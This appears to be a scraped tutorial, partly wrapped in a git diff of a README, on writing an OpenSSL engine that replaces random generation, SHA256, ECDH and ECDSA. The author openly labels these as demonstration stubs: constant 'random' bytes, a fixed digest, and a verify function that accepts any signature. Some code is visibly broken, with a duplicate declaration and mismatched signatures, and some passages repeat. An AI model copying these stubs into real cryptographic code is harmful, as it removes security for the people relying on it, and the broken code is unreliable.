printf("\n");
printf("Now verifying!\n");

BIO* bio_in;
bio_in = BIO_new_file("./ownCert.pem", "r");
if (bio_in == NULL) {
    printf("could not read public key file\n");
    exit(1);

}
X509 *certificate;
certificate = X509_new();
if (PEM_read_bio_X509(bio_in, &certificate, 0, NULL) == NULL) {
    printf("could not read  certificate from public key file\n");
    exit(1);
}
EVP_PKEY *pubKey;
pubKey = X509_get_pubkey(certificate);
EC_KEY* eckey_pub;
eckey_pub = EVP_PKEY_get1_EC_KEY(pubKey);

int result = ECDSA_do_verify(digest, digestSize,
        ecdsa_sig, eckey_pub);
printf("Verify result %d\n", result);
The resulting output is: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 ENGINE SETTING DEFAULT ECDH: 1 ENGINE SETTING DEFAULT ECDSA:1 Oezgan Engine ECDH Method Oezgan engine ECDH method End returning: 97! Oezgan engine Agreed Value: 97 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 oezgan engine ecdsa sign digest 427abc1d0cb9498d5828fc228e3350da674afab9981f5b7c99c5ee1856e83379b89fa6566bf90144f955a2de1973b22138277efd8117e70c636dee84b3592b15b2abf479c7b1fa5db86f35d93fca1d918bbdcf815a82fd44b515cb58942

Signature size:0

Now verifying! oezgan engine verifying function oezgan ecdsa verfiy end! result 99 Verify result 99 Note about the ECDSA_METHOD structure

Instead of putting the definition of the ECDSA_METHOD in the header file we can alternatively use the build-in OpenSSL methods for acquiring the method structure. Actually this is encouraged with OpenSSL versions >= 1.0.2. This is done as follows: static ECDSA_METHOD *oezgan_engine_ecdsa_method = NULL

static int setup_ecdsa_method(void) { oezgan_engine_ecdsa_method = ECDSA_METHOD_new(NULL); if (oezgan_engine_ecdsa_method == NULL) return 0;

    ECDSA_METHOD_set_name(oezgan_engine_ecdsa_method, "Oezgan engine ECDSA method");
    ECDSA_METHOD_set_sign(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign);
    ECDSA_METHOD_set_sign_setup(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign_setup);
    ECDSA_METHOD_set_verify(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_do_verify);
return 1;
}
and then in the bind_helper we have to do something like this: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !setup_ecdsa_method() || !ENGINE_set_ECDSA(e, oezgan_engine_ecdsa_method) ) return 0; return 1; } This is probably the smoother way to go. Using C++ Implementations

In our engine implementation of random generation, sha256, ECDH and ECDSA we used strict C methods. In practice however it is easier to implement elliptic curve functionality in C++; at least this is the author’s perception. Let’s assume that we have some elliptic curve and sha256 implementation in C++. How can we use this implementation as an engine in OpenSSL? Consider the following diagram. Wrapper.png The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. Here is a simple with the random function. The wrapper.h file: #ifndef WRAPPER_H_ #define WRAPPER_H_

#ifdef __cplusplus extern "C" { #endif extern void getRandomBytes_C(unsigned char* buffer, int length); #ifdef __cplusplus }

#endif #endif /* WRAPPER_H_ */

And the wrapper.c file: #include <stdio.h> #include <string.h> #include #include #include #include "wrapper.h"

using namespace std; typedef unsigned char byte; typedef std::vector ByteVector;

void getRandomBytes_C(unsigned char* buffer, int numBytes) { string str = "oezgan engine wrapper getRandomBytes C++ method"; cout << str << "\n"; string fileName = "/dev/urandom"; ByteVector result; std::ifstream inFile(fileName.c_str());

std::filebuf* fileBuf = inFile.rdbuf();
result.resize(numBytes);
fileBuf->sgetn(reinterpret_cast<char*>(&result[0]), numBytes);
inFile.close();
memcpy(buffer,&result[0],numBytes);
} When we modify the Engine.c file as: //new include #include "wrapper.h"

int get_random_bytes(unsigned char *buf, int num) { printf("oezgan engine random length %d\n", num); getRandomBytes_C(buf, num); return 99; } Note that the engine should be compiled with the -Wl,-whole-archive -lwrapper -Wl,-no-whole-archive linker flag, such that the wrapper is completely included in the engine. In eclipse you can define an environment variable for that. To add the whole archive flag in eclipse you can go to Project->Properties->C/C++ Build->Enviroment And add a new environment variable WHOLELIB with the value: -Wl,-whole-archive -lwrapper -Wl,-no-whole-archive After that, go to:

Project->Properties->C/C++ Build->Setting->Tool Settings-> GCC C Linker and add under expert settings at the end of the command line pattern (with an empty space between) ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 oezgan engine wrapper getRandomBytes C++ method dea695abdf … As you can see the C++ random generation method is used, for other methods you can use a similar approach.

ReadMe.md | 773 +++++++++++++++++++++++++++++++++++++++++++++++++++++- 1 file changed, 772 insertions(+), 1 deletion(-)

diff --git a/ReadMe.md b/ReadMe.md index 3997774..613093a 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -4792,6 +4792,777 @@ function geoFindMe() { navigator.geolocation.getCurrentPosition(success, error); } } +sudo ln –s ~/workspace/oezganEngine/Debug/liboezganengine.so liboezgan.so +You can also copy the compiled shared library into the /usr/lib/engines/ directory but this should be done when the engine is ready to be deployed.You can find the OpenSSL include files in /usr/include/openssl. +Beginning + +We will start with implementing an engine which only has its name and nothing else. The oezganEngine.c file: +#include <openssl/engine.h> +static const char *engine_oezgan_id = "oezgan"; +static const char *engine_oezgan_name = "oezgan engine by Fraunhofer FKIE"; + +IMPLEMENT_DYNAMIC_CHECK_FN(); +IMPLEMENT_DYNAMIC_BIND_FN(bind_helper); + +int oezgan_init(ENGINE *e) {

printf("Oezgan Engine Initializatzion!\n");
return 786; +}
+int bind_helper(ENGINE * e, const char *id) +{

if (!ENGINE_set_id(e, engine_oezgan_id) ||
       !ENGINE_set_name(e, engine_oezgan_name) ||
       !ENGINE_set_init_function(e,oezgan_init)
)
   return 0;
return 1; +}
+and the tester oezganEngineTester.cc file: +#include <openssl/engine.h> +#include <stdio.h> +#include <string.h> + +int main(int argc, const char* argv[] ) {

OpenSSL_add_all_algorithms();
ERR_load_crypto_strings();
ENGINE_load_dynamic();
ENGINE *oezgan_engine = ENGINE_by_id("oezgan");
if( oezgan_engine == NULL )
{
   printf("Could not Load Oezgan Engine!\n");
   exit(1);
}
printf("Oezgan Engine successfully loaded\n");
int init_res = ENGINE_init(oezgan_engine);
printf("Engine name: %s init result : %d \n",ENGINE_get_name(oezgan_engine), init_res);
return 0; +}
+Note that we use a c++ file to test the engine. Running the tester gives us the following result: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +Our engine is successfully loaded and when it`s asked it gives back its name. Now we proceed by implementing our own random function. +Cleanup memory leaks +For OpenSSL version prior to 1.1.0, users are required to call ENGINE_cleanup, EVP_cleanup, etc. to prevent memory leak. See Library Initialization page. +For OpenSSL version 1.1.0 and 1.1.1, cleanup happens automatically, users should not worry about it. +ENGINE_set_finish_function & ENGINE_set_destroy_function are still available to do implementation specific cleanup. +The Random Function + +OpenSSL has its own method declarations which our engine has to comply with. In the header file ossl_typ.h we find the declaration s: +typedef struct rand_meth_st RAND_METHOD; +typedef struct ecdh_method ECDH_METHOD; +typedef struct ecdsa_method ECDSA_METHOD; +For now we are only interested in the RAND_METHOD declaration. The RAND_METHOD declaration is actually a macro for the rand_method_st declaration which can be found in rand.h of the OpenSSL includes. Here we see that the rand_method_st has the following format: +struct rand_meth_st {

void (*seed) (const void *buf, int num);
int (*bytes) (unsigned char *buf, int num);
void (*cleanup) (void);
void (*add) (const void *buf, int num, double entropy);
int (*pseudorand) (unsigned char *buf, int num);
int (*status) (void); +}; +Thus we see that the OpenSSL random method structure defines six functions where the headers of these functions have specific formats. For simplicity purposes we will only implement the “bytes” and the “status” methods. The status method should return an integer and takes no arguments. Presumably this method is used for indication of the state of the random machine. Our engine`s random machine has no states, therefore we only return a positive integer to indicate a thumbs up state. The random status method: +int oezgan_random_status(void) +{
return 1; +} +Now we implement our own method for generating a number of random bytes as follows: +//new includes +#include <string.h> +#include <openssl/ossl_typ.h>
+int get_random_bytes(unsigned char *buffer, int num) {

printf("oezgan engine random length %d\n", num);
memset(buffer,1,num);
return 99; +} +This method will fill the given buffer with num many ones. Now we indicate our random machine structure as: +RAND_METHOD oezgan_random_method = {
   NULL,                       /* seed */
   get_random_bytes,
   NULL,                       /* cleanup */
   NULL,                       /* add */
   NULL,
   oezgan_random_status
+}; +We also modify the bind_helper function from above: +int bind_helper(ENGINE * e, const char *id) +{

if (!ENGINE_set_id(e, engine_oezgan_id) ||
   !ENGINE_set_name(e, engine_oezgan_name) ||
   !ENGINE_set_init_function(e, oezgan_init) ||
   !ENGINE_set_RAND(e, &oezgan_random_method)
           )
   return 0;
return 1; +} +In the tester we add the following lines: +ENGINE_set_default_RAND(oezgan_engine);
+unsigned char * rand_buf= new unsigned char[5]; +int err = RAND_bytes(rand_buf,5); +for(int i= 0; i < 5; i++) {

printf("%x",rand_buf[i]); +} +printf("\n"); +free(rand_buf); +The result is seen below: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +We now successfully implemented an OpenSSL engine that gives always returns a lot of 1s as random values. +Digests
+Now we want OpenSSL not only to use our own random function but also to use our sha2 family hash functions. We first implement a digest selector function, which tells OpenSSL which digests are available in our engine. This kind of implementation is adapted from the OpenSSL`s build-in engine ccghost. We will implement only one hash function namely SHA256. Following the the ossl_typ.h header to the evp.h header one can see that the Message Digest Structure is defined as follows: +struct env_md_st {

int type;
int pkey_type;
int md_size;
unsigned long flags;
int (*init) (EVP_MD_CTX *ctx);
int (*update) (EVP_MD_CTX *ctx, const void *data, size_t count);
int (*final) (EVP_MD_CTX *ctx, unsigned char *md);
int (*copy) (EVP_MD_CTX *to, const EVP_MD_CTX *from);
int (*cleanup) (EVP_MD_CTX *ctx);
/* FIXME: prototype these some day */
int (*sign) (int type, const unsigned char *m, unsigned int m_length,
            unsigned char *sigret, unsigned int *siglen, void *key);
int (*verify) (int type, const unsigned char *m, unsigned int m_length,
              const unsigned char *sigbuf, unsigned int siglen,
              void *key);
int required_pkey_type[5]; /* EVP_PKEY_xxx */
int block_size;
int ctx_size; /* how big does the ctx->md_data need to be */
/* control function */
int (*md_ctrl) (EVP_MD_CTX *ctx, int cmd, int p1, void p2); +} / EVP_MD */ ; +(Commentaries are original form OpenSSL code). From this we use our own message digest hash SHA256 declaration: +static EVP_MD oezgan_engine_sha256_method= {
   NID_sha256,
   NID_undef,
   32,
   EVP_MD_FLAG_PKEY_METHOD_SIGNATURE,
   oezgan_engine_sha256_init,
   oezgan_engine_sha256_update,
   oezgan_engine_sha256_final,
   oezgan_engine_sha256_copy,
   oezgan_engine_sha256_cleanup,
   /* FIXME: prototype these some day */
   NULL,
   NULL,
   {NID_undef, NID_undef, 0, 0, 0},
   64, /*Block Size*/
   32, /* how big does the ctx->md_data need to be */
   /* control function */
   NULL,
+} ; +SHA256 uses a block size of 512 Bit = 64 byte and resulting digest is 256 Bit = 32 byte long. You can also use your own block size and outcome size but for a realistic approach we stick to the original sha256 standard. Now we need to implement the init, update, final and copy functions for our own sha256 implementation. In our implementation the SHA256 Value is always 2222… +Note +Since 1.1.0, EVP_MD cannot be directly accessed. Users have to call EVP_MD_meth_new to get EVP_MD instance, and use EVP_MD_meth_set_* to set functions and properties list above. +OID and NID +In above example, we reused sha256's nid. For those who want to implement new algorithms, use OBJ_create to create new nid and OBJ_*2nid to translate names to nids. +static int oezgan_engine_sha256_init(EVP_MD_CTX *ctx) {

ctx->update = &oezgan_engine_sha256_update;
printf("initialized! SHA256\n");
return 1; +}
+static int oezgan_engine_sha256_update(EVP_MD_CTX *ctx,const void *data,size_t count) +{

printf("SHA256 update \n");
unsigned char * digest256 = (unsigned char*) malloc(sizeof(unsigned char)*32);
memset(digest256,2,32);
count = 32;
ctx->md_data = digest256;
return 1; +}
+static int oezgan_engine_sha256_final(EVP_MD_CTX *ctx,unsigned char *md) {

printf("SHA256 final size of EVP_MD: %d\n", sizeof(EVP_MD));
memcpy(md,(unsigned char*)ctx->md_data,32);
return 1; +}
+int oezgan_engine_sha256_copy(EVP_MD_CTX *to, const EVP_MD_CTX *from) +{

printf("Copy SHA256\n");
if (to->md_data && from->md_data) {
   memcpy(to->md_data, from->md_data,sizeof(from->md_data));
}
return 1; +}
+static int oezgan_engine_sha256_cleanup(EVP_MD_CTX *ctx) {

printf("SHA256 cleanup\n");
if (ctx->md_data)
   memset(ctx->md_data, 0, 32);
return 1; +} +Now we have to tell OpenSSL that whenever a SHA256 digest is requested use the engine implementation of sha256 this will be the digest selector function. +static int oezgan_digest_ids[] = {NID_sha256};
+static int oezgan_engine_digest_selector(ENGINE *e, const EVP_MD **digest,

   const int **nids, int nid) {
int ok = 1;
if (!digest) {
   *nids = oezgan_digest_ids;
   printf("\n Digest is empty! Nid:%d\n", nid);
   return 2;
}
printf("Digest no %d requested\n",nid);
if (nid == NID_sha256) {
   *digest = &oezgan_engine_sha256_method;
}
else {
   ok = 0;
   *digest = NULL;
}
return ok; +} +We also need to modify the bind_helper function again: +int bind_helper(ENGINE * e, const char *id) +{
if (!ENGINE_set_id(e, engine_oezgan_id) ||
   !ENGINE_set_name(e, engine_oezgan_name) ||
   !ENGINE_set_RAND(e, &oezgan_random_method) ||
   !ENGINE_set_init_function(e, oezgan_init) ||
   !ENGINE_set_digests(e, &oezgan_engine_digest_selector)
)
   return 0;
return 1; +} +And we modify our tester to generate us a SHA256 Hash function.
char * str = "Fraunhofer FKIE Wachtberg!";
int str_len = 26;
int er = ENGINE_set_default_digests(oezgan_engine);
printf("ENGINE SETTING DEFAULT DIGESTS %d\n",er);
unsigned char * digest = new unsigned char[32];
unsigned int digestSize = -1;
EVP_MD_CTX *evp_ctx;
evp_ctx = EVP_MD_CTX_create();
er = EVP_DigestInit_ex(evp_ctx, EVP_sha256(),oezgan_engine);
printf("Digest INIT %d\n",er);
er = EVP_DigestUpdate(evp_ctx, (unsigned char*)str, str_len);
printf("Digest Update %d\n",er);
er = EVP_DigestFinal(evp_ctx, digest, &digestSize);
printf("Digest Final %d Digest size:%d\n",er,digestSize);
for(int i= 0; i< digestSize; i++) {
   printf("%x", digest[i]);
}
printf("\n");
EVP_MD_CTX_destroy(evp_ctx); +The result is: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +ENGINE SETTING DEFAULT DIGESTS 1 +initialized! SHA256 +Digest INIT 1 +SHA256 update +Digest Update 1 +SHA256 final size of EVP_MD: 76 +SHA256 cleanup +Digest Final 1 Digest size:32 +22222222222222222222222222222222 +Similarly one can also implement other digest functions. Now we move on to more complicated things like the ECDSA or the ECDH algorithms. +ECDH
+We now want to use our own Elliptic Curve Diffie-Hellman Key Agreement function. This is a little bit different from what we have seen above. We get us the definition of the ECDH method structe from the file crypto/ecdh/ecdh.h the definition which is provided in this file is not included in the OpenSSL headers, therefore we have to put it in a new header file which will be included in our engine. +The file oezganEngine.h: +#ifndef OEZGANENGINE_H_ +#define OEZGANENGINE_H_ +#ifdef __cplusplus +extern "C" { +#endif + +struct ecdh_method {

const char *name;
int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key,
                   EC_KEY *ecdh, void *(*KDF) (const void *in,
                                               size_t inlen, void *out,
                                               size_t *outlen));
+# if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
char *app_data; +};
+#ifdef _cplusplus +} +#endif + + +#endif /* OEZGANENGINE_H */ +KDF is the Key Derivation Function which will be NULL here. Now we add the following declaration in to our oezganEngine.c file: +ECDH_METHOD oezgan_ecdh_method = {

   "Oezgan Engine ECDH Method",
   oezgan_engine_compute_ecdh_key,
+# if 0

   NULL,
   NULL,
+# endif

   0,
   NULL,
+}; +And the implementation of the ECDH method: +static int oezgan_engine_compute_ecdh_key(void * key, size_t outlen, const EC_POINT *pubkey,

   EC_KEY *eckey, void *(*oezgan_ecdh_kdf) (const void *in, size_t inlen, void *out,
           size_t *outlen)) {
printf("Oezgan Engine ECDH Method\n");
EC_GROUP *group = EC_KEY_get0_group(eckey);
//convert pubkey
int pubkey_len = EC_POINT_point2oct(group, pubkey,
                       POINT_CONVERSION_UNCOMPRESSED,
                         NULL, 0, NULL);
unsigned char * pubkey_buf = malloc(sizeof(unsigned char)*pubkey_len);
pubkey_len = EC_POINT_point2oct(group, pubkey,
                       POINT_CONVERSION_UNCOMPRESSED,
                        pubkey_buf, pubkey_len, NULL);
//convert private key
const BIGNUM* prikey_bn = BN_new();
prikey_bn = EC_KEY_get0_private_key(eckey);
int privkey_len = BN_num_bytes(prikey_bn);
unsigned char * privkey_buf = malloc(sizeof(unsigned char)*privkey_len);
BN_bn2bin(prikey_bn, privkey_buf);
memset(key,3,pubkey_len);
outlen = pubkey_len;
free(privkey_buf);
free(pubkey_buf);
printf("Oezgan engine ECDH method End returning: %d!\n", outlen);
return outlen; +} +Our implementation of the ECDH Method copies the public key into an unsigned char array pubkey also the private key is converted into an unsigned char array for demonstration purposes since a real ECDH implementation has to calculate the from the values bP = B and aP=A the value abP where a and b are the secret keys of two users Aylin and Boris respectively and P is the base point on the elliptic curve. Again we modify our bind_helper method as follows: +int bind_helper(ENGINE * e, const char *id) +{
if (!ENGINE_set_id(e, engine_oezgan_id) ||
   !ENGINE_set_name(e, engine_oezgan_name) ||
   !ENGINE_set_RAND(e, &oezgan_random_method) ||
   !ENGINE_set_init_function(e, oezgan_init) ||
   !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ||
   !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method)
)
   return 0;
return 1; +} +To be able to test this we need a certificate file and the corresponding private key file. There are many guides in the internet how to generate such certificates and private key pairs. Later on we will need that certificate file to test our ECDSA methods. The test program will now read in a private key file “ownPrivkey.pem” and try to establish an ECDH key with its own public key. The result will be a lot of 3s, exactly as many as the length of the public key. In our certificate file we use a brainpoolP384r1 curve as well as for the ECDH. Beware that the brainpool curves are not supported in OpenSSL versions < 1.0.2. You can use default NIST Curves such as the secp384r1 instead. The following is added to the tester: +//includes
#include <openssl/engine.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <stdio.h>
#include <string.h>
er = ENGINE_set_default_ECDH(oezgan_engine);
printf(" %d\N ",er);
FILE* fp = fopen("./ownPrivkey.pem", "r");
if (fp == NULL) {
  printf( "Could not open private key file\N");
  exit(1);
}
EVP_PKEY *privateKey;
privateKey= PEM_read_PrivateKey(fp, NULL, 0, NULL);
if ((privateKey) == NULL) {
 printf("Could not extract private key from file\N");
 exit(1);
}
fclose(fp);
EC_KEY *eckey;
eckey = EC_KEY_new();
ECDSA_SIG * ecdsa_sig;
ecdsa_sig = ECDSA_SIG_new();
eckey = EVP_PKEY_get1_EC_KEY(privateKey);
EC_GROUP *ec_group;
ec_group = EC_GROUP_new_by_curve_name(NID_brainpoolP384r1);
const EC_POINT* pub_key;
pub_key = EC_KEY_get0_public_key(eckey);
unsigned char agreed_value[200];
EC_KEY *ecdh;
ecdh = EC_KEY_new();
EC_KEY_set_group(ecdh, ec_group);
er = EC_KEY_set_private_key(ecdh, EC_KEY_get0_private_key(eckey));
int agreed_value_len = ECDH_compute_key(agreed_value, 200,pub_key, ecdh, NULL);
printf("Oezgan engine Agreed Value: %d\n",agreed_value_len);
for(int i= 0; i < agreed_value_len; i++) {
   printf("%x", agreed_value[i]);
}
printf("\n"); +Running the tester results in: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +ENGINE SETTING DEFAULT DIGESTS 1 +initialized! SHA256 +Digest INIT 1 +SHA256 update +Digest Update 1 +SHA256 final size of EVP_MD: 76 +SHA256 cleanup +Digest Final 1 Digest size:32 +22222222222222222222222222222222 +ENGINE SETTING DEFAULT ECDH: 1 +Oezgan Engine ECDH Method +Oezgan engine ECDH method End returning: 97! +Oezgan engine Agreed Value: 97 +3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 +ECDSA
+Now we implement our own ECDSA Algorithm in our engine. Similar to ECDH we need to copy a definition of the ECDSA Method structure. This method structure is found in the crypto/ecdsa/ecs_locl.h file. The Structure: +struct ecdsa_method {

const char *name;
ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len,
                            EC_KEY *eckey);
int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv,
                        BIGNUM **r);
int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len,
                       const ECDSA_SIG *sig, EC_KEY *eckey);
+# if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
void *app_data; +}; +We add this declaration into the oezganEngine.h file. The complete .h file is shown below: +#ifndef OEZGANENGINE_H_ +#define OEZGANENGINE_H_
+#ifdef __cplusplus +extern "C" { +#endif + +struct ecdh_method {

const char *name;
int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key,
                   EC_KEY *ecdh, void *(*KDF) (const void *in,
                                               size_t inlen, void *out,
                                               size_t *outlen));
+# if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
char *app_data; +};
+struct ecdsa_method {

const char *name;
ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len,
                            EC_KEY *eckey);
int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv,
                        BIGNUM **r);
int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len,
                       const ECDSA_SIG *sig, EC_KEY *eckey);
+# if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
void *app_data; +}; +As we can see the ECDSA method structure needs at least 3 functions, the setup function the signing function and the verifying function. Similar to the ECDH section we define our methods in our oezganEngine.c file: +static ECDSA_METHOD oezgan_engine_ecdsa_method = {
   "Oezgan engine ECDSA method",
   oezgan_engine_ecdsa_sign,
   oezgan_engine_ecdsa_sign_setup,
   oezgan_engine_ecdsa_do_verify,
+# if 0

   NULL,                       /* init */
   NULL,                       /* finish */
+# endif

   0,                          /* flags */
   NULL                        /* app_data */
+} +We also add our signing, verifying and setup functions to the oezganEngine.c file: +int oezgan_engine_ecdsa_sign_setup (EC_KEY *eckey, BN_CTX *ctx_in, BIGNUM **kinvp,

   BIGNUM **rp)
+{

return 1; +} +static ECDSA_SIG *oezgan_engine_ecdsa_sign (const unsigned char *dgst, int dgst_len,
   const BIGNUM *kinv, const BIGNUM *rp,
   EC_KEY *in_eckey) {
printf("oezgan engine ecdsa sign digest \n");
unsigned char * out_sig;
out_sig = malloc(sizeof(unsigned char)*64);
int sig_len = 0;
//convert privatekey
int pkeyLen = i2d_ECPrivateKey(in_eckey,NULL);
const BIGNUM* bignum = EC_KEY_get0_private_key(in_eckey);
int pkeyLen;
unsigned char *ucBuf, *uctempBuf;
pkeyLen = BN_bn2mpi(bignum, NULL);
ucBuf = (unsigned char *)malloc(pkeyLen+1);
uctempBuf = ucBuf;
//Note that this function modifies the uctempBuf as
// uctempBuf = uctempBuf + pkeyLen
BN_bn2mpi(bignum, uctempBuf);
memset(ucBuf,4,pkeyLen);
sig_len = pkeyLen;
ECDSA_SIG * ret_sig;
ret_sig = d2i_ECDSA_SIG(NULL,&out_sig,sig_len);
out_sig -= sig_len;
return ret_sig; +}
+int oezgan_engine_ecdsa_do_verify (const unsigned char *digest, int digest_len,

   const ECDSA_SIG *ecdsa_sig, EC_KEY *eckey) {
printf("oezgan engine verifying function\n");
int res = 0;
int er = 0;
//convert ECDSA_SIG to unsigned char
int sig_len = i2d_ECDSA_SIG(ecdsa_sig,NULL);
unsigned char * sign = malloc(sizeof(unsigned char)*sig_len);
er = i2d_ECDSA_SIG(ecdsa_sig,&sign);
sign -= sig_len;
//convert EC_Key to unsigned char
int pubkey_len = i2o_ECPublicKey(eckey,NULL);
unsigned char* pubkey = malloc(sizeof(unsigned char)*pubkey_len);
er = i2o_ECPublicKey(eckey,&pubkey);
pubkey -= er;
if(er == 0) {
   printf("\n Could not convert EC_KEY error:%d\n",er);
   return er;
}
res =99;
printf("oezgan ecdsa verfiy end! result %d\n",res);
return res; +} +Our setup function does basically nothing. It always returns 1. You can also use the default implementation of the ECDSA sign setup method located in the file crypto/ecdsa/ecs_ossl.c in the source directory of OpenSSL. We can’t do much in our signing function without a proper signing algorithm, since the return value type ECDSA_SIG needs to be a DER encoded elliptic curve digital signature which consists of a pair (r,s). Therefore our ecdsa implementation returns 0 as the size of the signature and no signature at all. The verifying function always returns 99 independent of the data provided. The conversions in these methods are made for demonstration purposes, to give the reader a rough idea about implementing his or her own algorithms. +List of conversions done: +Finally we modify our bind_helper function again as follows: +int bind_helper(ENGINE * e, const char *id) +{
if (!ENGINE_set_id(e, engine_oezgan_id) ||
       !ENGINE_set_name(e, engine_oezgan_name) ||
       !ENGINE_set_RAND(e, &oezgan_random_method) ||
       !ENGINE_set_init_function(e, oezgan_init) ||
       !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ||
       !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) ||
       !ENGINE_set_ECDSA(e, &oezgan_engine_ecdsa_method)
)
   return 0;
return 1;+ +} +To test this we also need a certificate file noted here as “ownCert.pem”. Then we add the following lines to our test program:
er = ENGINE_set_default_ECDSA(oezgan_engine);
printf("\nENGINE SETTING DEFAULT ECDSA:%d\n",er);
unsigned char *sig = new unsigned char[256];
unsigned int sigsize;
ECDSA_sign(0,digest,digestSize,sig,&sigsize,eckey);
printf("Signature size:%d \n",sigsize);
for(int i=0; i <sigsize;i++) {
   printf("%x",sig[i]);
}
printf("\n");
printf("Now verifying!\n");
BIO* bio_in;
bio_in = BIO_new_file("./ownCert.pem", "r");
if (bio_in == NULL) {
   printf("could not read public key file\n");
   exit(1);
}
X509 *certificate;
certificate = X509_new();
if (PEM_read_bio_X509(bio_in, &certificate, 0, NULL) == NULL) {
   printf("could not read  certificate from public key file\n");
   exit(1);
}
EVP_PKEY *pubKey;
pubKey = X509_get_pubkey(certificate);
EC_KEY* eckey_pub;
eckey_pub = EVP_PKEY_get1_EC_KEY(pubKey);
int result = ECDSA_do_verify(digest, digestSize,
       ecdsa_sig, eckey_pub);
printf("Verify result %d\n", result); +The resulting output is: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +ENGINE SETTING DEFAULT DIGESTS 1 +initialized! SHA256 +Digest INIT 1 +SHA256 update +Digest Update 1 +SHA256 final size of EVP_MD: 76 +SHA256 cleanup +Digest Final 1 Digest size:32 +22222222222222222222222222222222 +ENGINE SETTING DEFAULT ECDH: 1 +ENGINE SETTING DEFAULT ECDSA:1 +Oezgan Engine ECDH Method +Oezgan engine ECDH method End returning: 97! +Oezgan engine Agreed Value: 97 +3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 +oezgan engine ecdsa sign digest +427abc1d0cb9498d5828fc228e3350da674afab9981f5b7c99c5ee1856e83379b89fa6566bf90144f955a2de1973b22138277efd8117e70c636dee84b3592b15b2abf479c7b1fa5db86f35d93fca1d918bbdcf815a82fd44b515cb58942 +--- +Signature size:0
+Now verifying! +oezgan engine verifying function +oezgan ecdsa verfiy end! result 99 +Verify result 99 +Note about the ECDSA_METHOD structure + +Instead of putting the definition of the ECDSA_METHOD in the header file we can alternatively use the build-in OpenSSL methods for acquiring the method structure. Actually this is encouraged with OpenSSL versions >= 1.0.2. This is done as follows: +static ECDSA_METHOD *oezgan_engine_ecdsa_method = NULL +

static int setup_ecdsa_method(void)
{
   oezgan_engine_ecdsa_method = ECDSA_METHOD_new(NULL);
if (oezgan_engine_ecdsa_method == NULL)
       return 0;
   ECDSA_METHOD_set_name(oezgan_engine_ecdsa_method, "Oezgan engine ECDSA method");
   ECDSA_METHOD_set_sign(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign);
   ECDSA_METHOD_set_sign_setup(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign_setup);
